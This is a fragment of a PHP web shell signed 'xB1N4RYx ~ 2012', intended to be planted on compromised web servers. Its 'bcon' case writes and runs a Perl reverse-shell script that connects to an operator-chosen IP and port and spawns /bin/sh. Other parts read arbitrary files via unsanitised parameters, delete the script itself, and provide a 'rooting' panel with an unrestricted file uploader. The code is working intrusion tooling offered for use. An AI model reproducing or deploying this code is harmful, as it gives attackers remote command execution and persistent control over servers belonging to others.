	case "selfremove":
		unlink($_SERVER['SCRIPT_FILENAME']);
		echo '<script>alert(\'Removed '.$_SERVER["SCRIPT_FILENAME"].'!\');';
		echo 'location.href="?page=is_it_really_gone?";';
		echo '</script>';
	break;
	
	case "viewimage":
		$i = $_GET['i'];
		$v = realpath($_SESSION['current_folder']).$cslash.$i;
		/*echo $v;
		echo '<center>';
		echo '<img src="C:\www/menace.png" border="0"/>';
		echo '</center>';*/
		header("Content-type: image/png");
		ob_clean();
		flush();
		readfile($v);
	break;
	
	case "viewmovie":
		$i = $_GET['i'];
		$v = realpath($_SESSION['current_folder']).$cslash.$i;
		header("Content-type: video/quicktime");
		ob_clean();
		flush();
		readfile($v);
	break;
	
	case "bcon":
		echo '<div id="login" style="margin-top: 10px; margin-left: 10px;">';
		echo '<form action="?page=bcon" method="get"><input type="hidden" name="page" value="bcon"/>';
		echo 'IP:<br><input type="text" name="ip" value="'.getenv("remote_addr").'" style="margin-top: 5px;"/><br><br>';
		echo 'Port:<input type="submit" value="Connect" style="margin-left: 130px; margin-top: -4px;"/><br><input type="text" name="port" value="666" style="margin-top: 5px;"/>';
		echo '</form>';
		echo '</div>';
		if(isset($_GET['ip']) && isset($_GET['port'])){
			$ip = $_GET['ip'];
			$port = $_GET['port'];
			$bc = fopen("/tmp/bxcon.pl","w");
			fwrite($bc,'#!/usr/bin/perl
use Socket;
$iaddr=inet_aton("'.$ip.'") || die("Error: $!\n");
$paddr=sockaddr_in("'.$port.'", $iaddr) || die("Error: $!\n");
$proto=getprotobyname("tcp");
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("/bin/sh -i");
close(STDIN);
close(STDOUT);
close(STDERR);');
			fclose($bc);
			shell_exec("perl /tmp/bxcon.pl");
			unlink("/tmp/bxcon.pl");
		}
	break;

}

echo '</td>
</tr>
</table>
<br><center>xB1N4RYx ~ 2012</center><br>
</body>
</html>';
?>
<?php
function rooting()
{
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Yuklendi</b><br><br>'; }
	else { echo '<b>Basarisiz</b><br><br>'; }
}
}
$x = $_GET["x"];
Switch($x){
case "rooting";
	rooting();
	break;
	
	}
?>